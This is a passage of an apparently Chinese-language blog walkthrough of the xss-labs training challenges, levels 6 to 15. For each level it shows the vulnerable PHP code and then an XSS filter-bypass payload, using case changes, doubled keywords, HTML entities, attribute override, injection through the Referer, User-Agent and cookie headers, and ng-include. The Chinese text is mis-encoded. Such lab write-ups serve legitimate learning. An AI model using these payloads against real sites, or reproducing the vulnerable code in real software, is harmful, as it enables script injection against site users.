<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;click&lt;&#x2F;a&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆå˜æˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;ag&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;click&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>







<h1 id="Pass6ã€å¤§å°å†™ç»•è¿‡ã€‘"><a href="#Pass6ã€å¤§å°å†™ç»•è¿‡ã€‘" class="headerlink" title="Pass6ã€å¤§å°å†™ç»•è¿‡ã€‘"></a>Pass6ã€å¤§å°å†™ç»•è¿‡ã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™å…³æ²¡æœ‰å°†keywordè½¬å°å†™ï¼Œå°±æœ‰äº†æ¼æ´ï¼Œå°†ä¸Šä¸€å…³hrefå˜æˆå¤§å†™å³å¯ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&quot;&gt;&lt;a HREF&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;click&lt;&#x2F;a&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>







<h1 id="Pass7ã€åŒå†™ç»•è¿‡ã€‘"><a href="#Pass7ã€åŒå†™ç»•è¿‡ã€‘" class="headerlink" title="Pass7ã€åŒå†™ç»•è¿‡ã€‘"></a>Pass7ã€åŒå†™ç»•è¿‡ã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯åˆ©ç”¨Pass5çš„payloadï¼ŒåŒå†™ä¸€ä¸‹å³å¯ã€javascripté‡Œçš„scriptä¹Ÿè¦åŒå†™ã€‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&quot;&gt;&lt;a hrhrefef&#x3D;&quot;javascrscriptipt:alert(&#x2F;xss&#x2F;)&quot;&gt;click&lt;&#x2F;a&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>









<h1 id="Pass8ã€HTMLå­—ç¬¦å®ä½“ç»•è¿‡ã€‘"><a href="#Pass8ã€HTMLå­—ç¬¦å®ä½“ç»•è¿‡ã€‘" class="headerlink" title="Pass8ã€HTMLå­—ç¬¦å®ä½“ç»•è¿‡ã€‘"></a>Pass8ã€HTMLå­—ç¬¦å®ä½“ç»•è¿‡ã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:"</span>.strlen($str7).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€å…³ç”¨åˆ°äº†å®ä½“å­—ç¬¦ç»•è¿‡ï¼Œå…ˆæä¾›ä¸€ä¸ª<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">è½¬åŒ–ä¸ºå®ä½“å­—ç¬¦çš„ç½‘ç«™</a></p>
<p>æˆ‘ä»¬åˆ©ç”¨è¿™å¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#39;.$str7.&#39;&quot;&gt;å‹æƒ…é“¾æ¥&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨HTMLå­—ç¬¦å®ä½“æ„é€ ã€å­—ç¬¦å®ä½“åœ¨åç«¯æ˜¾ç¤ºä¸º<code>&amp;#115;</code>ï¼Œåˆ°äº†å‰ç«¯HTMLé¡µé¢è½¬åŒ–ä¸ºsï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡åç«¯ã€‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(&#x2F;xss&#x2F;)</span><br></pre></td></tr></table></figure>

<p>ä½†è¦è®°ä½ï¼Œè¿™ä¸ªå¿…é¡»è¦åœ¨è¾“å…¥æ¡†è¾“å…¥æäº¤ï¼Œä¸èƒ½åœ¨hackbaræäº¤ã€‚å› ä¸ºæ­¤æ—¶&amp;ä¼šè¢«å½“åˆGETå‚æ•°ä¹‹é—´çš„åˆ†éš”ç¬¦ã€‚</p>
<h1 id="Pass9ã€HTMLå­—ç¬¦å®ä½“ç»•è¿‡2ã€‘"><a href="#Pass9ã€HTMLå­—ç¬¦å®ä½“ç»•è¿‡2ã€‘" class="headerlink" title="Pass9ã€HTMLå­—ç¬¦å®ä½“ç»•è¿‡2ã€‘"></a>Pass9ã€HTMLå­—ç¬¦å®ä½“ç»•è¿‡2ã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:"</span>.strlen($str7).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ç›¸æ¯”äºPass8ï¼Œå¤šäº†è¿™å—</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬æ„é€ </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(&#39;http:&#x2F;&#x2F;&#39;)</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(&#x2F;xss&#x2F;)&#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>









<h1 id="Pass10ã€ç›¸åŒå±æ€§çš„è¦†ç›–ã€‘"><a href="#Pass10ã€ç›¸åŒå±æ€§çš„è¦†ç›–ã€‘" class="headerlink" title="Pass10ã€ç›¸åŒå±æ€§çš„è¦†ç›–ã€‘"></a>Pass10ã€ç›¸åŒå±æ€§çš„è¦†ç›–ã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ„é€ å…³äºt_sortçš„payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&quot; onmouseover&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot; type&#x3D;&quot;text</span><br></pre></td></tr></table></figure>

<p>æœ€åç›¸å½“äºã€å› ä¸ºäº‹ä»¶è§¦å‘éœ€è¦æ˜¾ç¤ºå‡ºè¿™ä¸ªtextæ¡†ï¼Œæ‰€ä»¥è¦æŠŠtypeå±æ€§æ”¹ä¸€ä¸‹ã€‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;ag&quot; onmouseover&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot; type&#x3D;&quot;text&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>









<h1 id="Pass11ã€HTTPè¯·æ±‚å¤´1ã€‘"><a href="#Pass11ã€HTTPè¯·æ±‚å¤´1ã€‘" class="headerlink" title="Pass11ã€HTTPè¯·æ±‚å¤´1ã€‘"></a>Pass11ã€HTTPè¯·æ±‚å¤´1ã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/08/xss-labs/11-1.png" alt="11-1"></p>
<p>åˆ©ç”¨refererè¯·æ±‚å¤´ä¼ ä¸Šä¸€å…³çš„payloadå³å¯</p>
<h1 id="Pass12ã€HTTPè¯·æ±‚å¤´2ã€‘"><a href="#Pass12ã€HTTPè¯·æ±‚å¤´2ã€‘" class="headerlink" title="Pass12ã€HTTPè¯·æ±‚å¤´2ã€‘"></a>Pass12ã€HTTPè¯·æ±‚å¤´2ã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å·®ä¸å¤šï¼Œå°±æ˜¯æ¢äº†ä¸ªè¯·æ±‚å¤´</p>
<p><img src="/2021/02/08/xss-labs/12-1.png" alt="12-1"></p>
<h1 id="Pass13ã€cookieä¼ å‚ã€‘"><a href="#Pass13ã€cookieä¼ å‚ã€‘" class="headerlink" title="Pass13ã€cookieä¼ å‚ã€‘"></a>Pass13ã€cookieä¼ å‚ã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payloadè¿˜æ˜¯Pass10çš„ï¼Œæ”¹ä¸€ä¸‹cookieå³å¯</p>
<p><img src="/2021/02/08/xss-labs/13-1.png" alt="13-1"></p>
<h1 id="Pass14ã€exifã€‘"><a href="#Pass14ã€exifã€‘" class="headerlink" title="Pass14ã€exifã€‘"></a>Pass14ã€exifã€‘</h1><p>é“¾æ¥å¤±æ•ˆäº†ï¼Œæ‰¾æœºä¼šè‡ªå·±å¤ç°ä¸€ä¸‹</p>
<h1 id="Pass15ã€ng-includeåŒ…å«æ¼æ´ã€‘"><a href="#Pass15ã€ng-includeåŒ…å«æ¼æ´ã€‘" class="headerlink" title="Pass15ã€ng-includeåŒ…å«æ¼æ´ã€‘"></a>Pass15ã€ng-includeåŒ…å«æ¼æ´ã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ng-includeå¯ä»¥åŒ…å«ä¸€ä¸ªæ–‡ä»¶æˆ–æ˜¯htmlé¡µé¢ï¼Œ<strong>æ„æ€å°±æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨srcåŒ…å«ä¸€ä¸ªå­˜åœ¨xssçš„é¡µé¢ã€‚</strong></p>
<p>ä½†æ˜¯è¦è®°ä½æ ¼å¼</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class&#x3D;&quot;ng-include:&#39;a.php&#39;&quot;</span><br><span class="line">class&#x3D;&#39;ng-include:&quot;a.php&quot;&#39;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>1.ng-include,å¦‚æœå•çº¯æŒ‡å®šåœ°å€ï¼Œå¿…é¡»è¦åŠ å¼•å·</strong></p>
<p><strong>2.ng-include,åŠ è½½å¤–éƒ¨htmlï¼Œscriptæ ‡ç­¾ä¸­çš„å†…å®¹ä¸æ‰§è¡Œ</strong></p>
<p><strong>3.ng-include,åŠ è½½å¤–éƒ¨htmlä¸­å«æœ‰styleæ ‡ç­¾æ ·å¼å¯ä»¥è¯†åˆ«</strong></p>
</blockquote>
<p>é€‰ä¸€ä¸ªPassæ„é€ ï¼Œä½†æ˜¯å› ä¸ºè¢«å•å¼•å·åŒ…è£¹ï¼Œæ‰€ä»¥è¯¥Passçš„æ„é€ é‡Œä¸èƒ½å«æœ‰å•å¼•å·</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src&#x3D;&#39;level4.php?keyword&#x3D;ag&quot; onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)&#39;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™é‡Œè™½ç„¶æœ‰htmlspecialcharsï¼Œä½†æ˜¯å¹¶ä¸å½±å“ã€‚</p>
<p>æœ¬äººè§è§£ï¼šåœ¨Pass15è¿™ä¸ªé¡µé¢ä¸Šï¼Œè™½ç„¶æˆ‘ä»¬çœ‹åˆ°å¯¹äºPass4é¡µé¢çš„GETå‚æ•°å·²ç»è¢«å®ä½“åŒ–</p>
<p><img src="/2021/02/08/xss-labs/15-1.png" alt="15-1"></p>
